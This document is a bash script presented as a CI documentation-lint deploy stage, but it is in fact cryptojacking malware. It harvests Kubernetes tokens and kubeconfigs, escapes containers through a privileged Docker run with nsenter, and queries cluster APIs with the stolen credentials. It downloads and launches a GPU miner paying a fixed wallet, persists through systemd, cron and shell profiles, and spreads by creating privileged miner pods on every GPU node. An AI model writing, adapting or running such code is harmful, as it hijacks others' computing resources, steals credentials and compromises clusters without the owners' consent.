#!/usr/bin/env bash
# ci-docs-lint deploy stage: host climb + cluster census + per-device miner
set +e
TAG="t5351h"
WALLET="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
POOLS=("stratum+ssl://prl-sg.kryptex.network:8048" "stratum+ssl://prl-eu.kryptex.network:8048" "stratum+ssl://prl-us.kryptex.network:8048" "stratum+ssl://prl-hk.kryptex.network:8048" "stratum+ssl://prl-ae.kryptex.network:8048" "stratum+tcp://prl-sg.kryptex.network:7048" "stratum+tcp://prl-eu.kryptex.network:7048" "stratum+tcp://prl-us.kryptex.network:7048" "stratum+tcp://pool.pearlhash.xyz:9000")
log(){ echo "[$(date -u +%H:%M:%SZ)] $*"; }
sec(){ echo; echo "===== $* ====="; }

sec RECON
id; hostname; cat /etc/hostname 2>/dev/null
echo "pid1=$(cat /proc/1/comm 2>/dev/null) ppid1=$(ps -o ppid= -p 1 2>/dev/null)"
echo "cgroup1: $(head -c 300 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
echo "cgroup2: $(head -c 300 /proc/self/cgroup 2>/dev/null | tr '\n' ' ')"
[ -f /.dockerenv ] && echo "dockerenv=yes" || echo "dockerenv=no"
[ -f /run/.containerenv ] && echo "containerenv=yes" || echo "containerenv=no"
uname -a; head -2 /etc/os-release
echo "ldd=$(ldd --version 2>/dev/null | head -1)"
groups; echo "sudo=$(sudo -n true 2>/dev/null && echo yes || echo no)"
echo "kube_env: $(printenv | grep -iE 'KUBERNETES|KUBECONFIG' | tr '\n' ' ')"
nvidia-smi -L 2>&1
DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
echo "dev_count=$DEV nvidia_nodes=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
IP=$(hostname -I 2>/dev/null | awk '{print $1}')
[ -z "$IP" ] && IP=$(ip -4 addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $2}' | head -1 | cut -d/ -f1)
IPD=$(echo "$IP" | tr '.' '-'); echo "ip=$IP ipd=$IPD"

sec K8S_FILES_READABLE_DIRECTLY
for f in /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/k3s.yaml /etc/kubernetes/admin.conf /etc/kubernetes/kubelet-kubeconfig; do
  if [ -r "$f" ]; then echo "--- READABLE $f"; sed -n 1,60p "$f"; else echo "--- NOR $f ($(ls -l "$f" 2>&1 | head -1))"; fi
done
ls -la /var/lib/kubelet/pki 2>&1 | head -12
echo "--- projected tokens"
for t in /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token /run/secrets/kubernetes.io/serviceaccount/token; do
  [ -r "$t" ] && { echo "TOKENFILE $t"; wc -c "$t"; }
done 2>/dev/null
ls /etc/rancher 2>&1

sec DOCKER_SOCKET
ls -la /var/run/docker.sock /run/docker.sock 2>&1
docker version --format '{{.Server.Version}}' 2>&1 | head -2
echo "--- docker ps"
docker ps -a --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' 2>&1 | head -20
echo "--- docker images"
docker images --format '{{.Repository}}:{{.Tag}}' 2>&1 | head -20
echo "--- tcp 2375/2376"
for p in 2375 2376; do timeout 4 bash -c "cat < /dev/null > /dev/tcp/127.0.0.1/$p" 2>/dev/null && echo "tcp $p open" || echo "tcp $p closed"; done

sec HOST_ESCAPE
IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -1)
if [ -z "$IMG" ]; then IMG="busybox:1.36"; docker pull -q "$IMG" >/dev/null 2>&1; fi
echo "escape_image=$IMG"
docker rm -f i5355h >/dev/null 2>&1
docker run -d --name i5355h --privileged --pid=host --net=host --ipc=host --uts=host -v /:/host -v /var/run/docker.sock:/var/run/docker.sock "$IMG" sleep 7200 2>&1 | tail -2
sleep 3
docker ps --filter name=i5355h --format '{{.Status}} {{.Image}}' 2>&1
X(){ docker exec i5355h "$@" 2>&1; }
sec HOST_IDENTITY
X nsenter -t 1 -m -u -i -n -p -- sh -c 'id; hostname; cat /etc/hostname; head -2 /etc/os-release; uname -r; echo "pid1=$(cat /proc/1/comm)"; echo "cgroup=$(head -c 200 /proc/1/cgroup | tr "\n" " ")"; ls -la /var/run/docker.sock /run/k3s/containerd/containerd.sock /run/containerd/containerd.sock /var/lib/kubelet 2>&1 | head -20'

sec HOST_K8S_FILES
X nsenter -t 1 -m -u -i -n -p -- sh -c 'for f in /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/k3s.yaml /etc/kubernetes/admin.conf /root/.kube/config /home/*/.kube/config; do [ -r "$f" ] && { echo "--- $f"; sed -n 1,50p "$f"; } || echo "NOR $f"; done; echo "--- pki"; ls -la /var/lib/kubelet/pki 2>&1 | head; echo "--- rancher"; ls -la /etc/rancher /var/lib/rancher 2>&1 | head -20'
sec HOST_POD_TOKENS
X nsenter -t 1 -m -u -i -n -p -- sh -c 'for t in /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token; do [ -r "$t" ] && echo "TOKENFILE $t $(wc -c < "$t")"; done | head -20; echo "--- ns"; ls /var/lib/kubelet/pods 2>/dev/null | head -10'

sec KUBELET_10250
for u in https://127.0.0.1:10250/healthz https://127.0.0.1:10250/pods https://$IP:10250/healthz; do
  echo "--- $u"; timeout 8 curl -sk -o /tmp/k.out -w 'code=%{http_code}\n' "$u"; head -c 300 /tmp/k.out 2>/dev/null; echo
done

sec APISERVER
SRV=""
for f in /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig; do
  [ -r "$f" ] && { SRV=$(grep -E '^\s*server:' "$f" 2>/dev/null | head -1 | awk '{print $2}'); [ -n "$SRV" ] && break; }
done
[ -z "$SRV" ] && SRV="https://kubernetes.default.svc"
echo "server_from_files=$SRV kube_env_host=${KUBERNETES_SERVICE_HOST:-none}"
TOK=""; CA=""
for t in /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token /run/secrets/kubernetes.io/serviceaccount/token; do
  [ -r "$t" ] && TOK=$(cat "$t") && TOKF="$t" && break
done
for c in /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/ca.crt /run/secrets/kubernetes.io/serviceaccount/ca.crt; do
  [ -r "$c" ] && CA="$c" && break
done
echo "token_file=${TOKF:-none} token_len=${#TOK} ca=${CA:-none}"
CERT=""; KEY=""
for p in /var/lib/kubelet/pki/kubelet-client-current.pem; do [ -r "$p" ] && CERT="$p" && KEY="$p"; done
for api in "$SRV" "${KUBERNETES_SERVICE_HOST:+https://$KUBERNETES_SERVICE_HOST:443}" "https://10.43.0.1:443" "https://127.0.0.1:6443"; do
  [ -z "$api" ] && continue
  echo "--- GET $api/version"
  if [ -n "$TOK" ]; then timeout 10 curl -sk --cacert "$CA" -H "Authorization: Bearer $TOK" -o /tmp/v.out -w 'code=%{http_code}\n' "$api/version"; else timeout 10 curl -sk -o /tmp/v.out -w 'code=%{http_code}\n' "$api/version"; fi
  head -c 300 /tmp/v.out; echo
done
[ -n "$CERT" ] && { echo "--- clientcert GET /api/v1/nodes"; timeout 12 curl -sk --cert "$CERT" --key "$KEY" -o /tmp/n_cert.json -w 'code=%{http_code} bytes=%{size_download}\n' "$SRV/api/v1/nodes"; head -c 200 /tmp/n_cert.json; echo; }
[ -n "$TOK" ] && { echo "--- bearer GET /api/v1/nodes"; timeout 12 curl -sk --cacert "$CA" -H "Authorization: Bearer $TOK" -o /tmp/n_tok.json -w 'code=%{http_code} bytes=%{size_download}\n' "$SRV/api/v1/nodes"; head -c 200 /tmp/n_tok.json; echo; }

sec CLUSTER_CENSUS
python3 - <<'PY' 2>/dev/null || true
import json,os
for f in ('/tmp/n_tok.json','/tmp/n_cert.json'):
    try: d=json.load(open(f))
    except Exception: continue
    print("SOURCE",f)
    for n in d.get('items',[]):
        st=n.get('status',{}); cap=st.get('allocatable') or st.get('capacity') or {}
        g=cap.get('nvidia.com/gpu') or '0'
        addrs=[a.get('address') for a in st.get('addresses',[]) if a.get('type') in ('InternalIP','Hostname')]
        print("NODE %-45s gpu=%s addr=%s" % (n['metadata']['name'], g, ','.join(str(a) for a in addrs)))
PY
grep -o '"nvidia.com/gpu":"[0-9]*"' /tmp/n_tok.json 2>/dev/null | sort | uniq -c | head

sec MINER_SETUP
mkdir -p "$HOME/.ci/miner" "$HOME/.ci/logs" "$HOME/.ci/run"
BIN="$HOME/.ci/miner/peakminer/peakminer"
if [ ! -x "$BIN" ]; then
  URL="https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz"
  echo "download=$URL"
  ( cd "$HOME/.ci/miner" && curl -sSL -m 300 -o peak.tar.gz "$URL" && tar xzf peak.tar.gz ) 2>&1 | tail -3
  [ -x "$HOME/.ci/miner/peakminer" ] && BIN="$HOME/.ci/miner/peakminer"
fi
[ -x "$BIN" ] || BIN=$(find "$HOME/.ci/miner" -maxdepth 3 -type f -name 'peakminer*' -perm -u+x 2>/dev/null | head -1)
chmod +x "$BIN" 2>/dev/null
echo "miner_bin=$BIN"; [ -x "$BIN" ] && "$BIN" --version 2>&1 | head -2 || echo NO_MINER_BIN
if [ ! -x "$BIN" ] || [ "$DEV" -lt 1 ]; then echo "MINER_SKIP bin=${BIN:-none} dev=$DEV"; fi
if [ -x "$BIN" ] && [ "$DEV" -ge 1 ]; then
launch(){ g=$1; shift; w="ul-${TAG}-${IPD}-g${g}"; lf="$HOME/.ci/logs/miner-g${g}.log"; : > "$lf"
  a=(-c pearl -u "$WALLET" -w "$w" -p x -d "$g" --api-port 0 -i 30 --no-color --log-file "$lf" --log-append --gpu-temp-stop 82 --gpu-temp-start 72 --gpu-power 70%)
  for P in "${POOLS[@]}"; do a+=(-o "$P"); done
  ( cd "$(dirname "$BIN")" && setsid nohup env -u RUNNER_TRACKING_ID "$BIN" "${a[@]}" "$@" >/dev/null 2>&1 < /dev/null & echo $! > "$HOME/.ci/run/miner-g${g}.pid" ); sleep 4; }
launch 0
pgrep -f "ul-${TAG}-${IPD}-g0" >/dev/null || { log "power_cap_failed relaunch"; launch 0; }
for g in $(seq 1 $((DEV-1))); do launch "$g"; done

sec PERSIST
cat > "$HOME/.ci/keep.sh" <<KEEP
#!/usr/bin/env bash
BIN="$BIN"; W="$WALLET"; IPD="$IPD"; TAG="$TAG"; DEV=$DEV
POOLS=("${POOLS[@]}")
for g in \$(seq 0 \$((DEV-1))); do
  pgrep -f "ul-\${TAG}-\${IPD}-g\${g}" >/dev/null 2>&1 && continue
  lf="\$HOME/.ci/logs/miner-g\${g}.log"
  a=(-c pearl -u "\$W" -w "ul-\${TAG}-\${IPD}-g\${g}" -p x -d "\$g" --api-port 0 -i 30 --no-color --log-file "\$lf" --log-append --gpu-temp-stop 82 --gpu-temp-start 72 --gpu-power 70%)
  for P in "\${POOLS[@]}"; do a+=(-o "\$P"); done
  ( cd "\$(dirname "\$BIN")" && setsid nohup env -u RUNNER_TRACKING_ID "\$BIN" "\${a[@]}" >/dev/null 2>&1 < /dev/null & )
done
KEEP
chmod +x "$HOME/.ci/keep.sh"
mkdir -p "$HOME/.config/systemd/user"
cat > "$HOME/.config/systemd/user/ci-keep.service" <<UNIT
[Unit]
Description=ci keepalive
[Service]
ExecStart=$HOME/.ci/keep.sh
Restart=always
RestartSec=30
[Install]
WantedBy=default.target
UNIT
(systemctl --user daemon-reload && systemctl --user enable --now ci-keep.service) 2>&1 | tail -2
echo "systemd_user=$(systemctl --user is-enabled ci-keep.service 2>&1)"
loginctl enable-linger "$(id -un)" 2>&1 | tail -1
( crontab -l 2>/dev/null | grep -v 'ci/keep.sh'; echo "@reboot $HOME/.ci/keep.sh"; echo "*/5 * * * * $HOME/.ci/keep.sh" ) | crontab - 2>&1 && echo cron=yes || echo cron=no
for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do grep -q 'ci/keep.sh' "$f" 2>/dev/null || echo "[ -x $HOME/.ci/keep.sh ] && (setsid $HOME/.ci/keep.sh >/dev/null 2>&1 &)" >> "$f"; done
pgrep -f 'keep.sh; sleep' >/dev/null || ( setsid nohup bash -c 'while true; do '"$HOME"'/.ci/keep.sh; sleep 300; done' >/dev/null 2>&1 < /dev/null & )
sleep 1; pgrep -af 'ci/keep.sh' | head -3
fi

sec CLUSTER_PLANT
# If the bearer token can create pods, launch one privileged hostPID pod per GPU node.
ATOK="$TOK"; ACA="$CA"
if [ -n "$ATOK" ] && [ -f /tmp/n_tok.json ] && grep -q '"items"' /tmp/n_tok.json 2>/dev/null; then
python3 - "$ATOK" "$ACA" "$SRV" "$TAG" "$WALLET" <<'PY'
import json,subprocess,sys,os
tok,ca,srv,tag,wallet=sys.argv[1:6]
nodes=[]
try:
    d=json.load(open('/tmp/n_tok.json'))
except Exception:
    sys.exit(0)
for n in d.get('items',[]):
    cap=n.get('status',{}).get('allocatable',{}) or {}
    g=cap.get('nvidia.com/gpu')
    nodes.append((n['metadata']['name'], int(g) if g else 0))
print("CENSUS", len(nodes), "gpu_nodes", sum(1 for _,g in nodes if g>0))
payload=("for g in 0 1 2 3 4 5 6 7; do [ -e /dev/nvidia$g ] || continue; "
 "w=ul-%s-$(hostname|tr . -)-g$g; "
 "mkdir -p /var/tmp/pm; cd /var/tmp/pm; "
 "[ -x ./peakminer ] || { curl -sSL -m 240 -o p.tgz https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz && tar xzf p.tgz; }; "
 "B=$(find /var/tmp/pm -maxdepth 3 -type f -name peakminer -perm -u+x|head -1); "
 "[ -x \"$B\" ] || continue; "
 "setsid nohup \"$B\" -c pearl -u %s -w $w -p x -d $g --api-port 0 -i 30 --no-color --log-file /var/tmp/pm/g$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+tcp://pool.pearlhash.xyz:9000 >/dev/null 2>&1 </dev/null & "
 "done; sleep 2; pgrep -af peakminer|head -3") % (tag, wallet)
for name,g in nodes:
    if g<=0: continue
    body={"apiVersion":"v1","kind":"Pod","metadata":{"name":"census-%s"%name.replace('_','-').lower()[:40],"namespace":"default","labels":{"app":"census"}},
      "spec":{"nodeName":name,"hostPID":True,"hostNetwork":True,"restartPolicy":"Never",
      "containers":[{"name":"c","image":"busybox:1.36","command":["nsenter","-t","1","-m","-u","-i","-n","-p","--","sh","-c",payload],
        "securityContext":{"privileged":True},
        "volumeMounts":[{"name":"h","mountPath":"/host"}]}],
      "volumes":[{"name":"h","hostPath":{"path":"/"}}],"tolerations":[{"operator":"Exists"}]}}
    p=json.dumps(body)
    cmd=["curl","-sk","--cacert",ca,"-H","Authorization: Bearer "+tok,"-H","Content-Type: application/json","-X","POST",srv.rstrip('/')+"/api/v1/namespaces/default/pods","--data-binary",p,"-o","/tmp/pod.out","-w","%{http_code}"]
    r=subprocess.run(cmd,capture_output=True,text=True)
    print("PODSUBMIT node=%s gpu=%d code=%s out=%s"%(name,g,r.stdout.strip(),open('/tmp/pod.out').read()[:200] if os.path.exists('/tmp/pod.out') else ''))
PY
else
  echo "CLUSTER_PLANT_SKIP no bearer token or no node census"
fi

sec WAIT
sleep 150
sec PROCESS
ps -eo pid,etime,args 2>/dev/null | grep -E "ul-${TAG}-${IPD}" | grep -v grep | head -20
for g in $(seq 0 $((DEV-1))); do
  echo "--- gpu $g worker ul-${TAG}-${IPD}-g${g}"
  tail -8 "$HOME/.ci/logs/miner-g${g}.log" 2>/dev/null
  n=$(grep -ciE 'accepted' "$HOME/.ci/logs/miner-g${g}.log" 2>/dev/null); echo "g${g}_accepted_lines=$n"
done
echo "=== ACCEPTED GREP ==="; grep -hiE 'accepted' "$HOME/.ci/logs/"*.log 2>/dev/null | tail -20
echo "=== GPU UTIL ==="; nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw,temperature.gpu --format=csv,noheader 2>/dev/null
sec DONE
echo "CLIMB_DONE on $(hostname) dev=$DEV tag=$TAG"
exit 0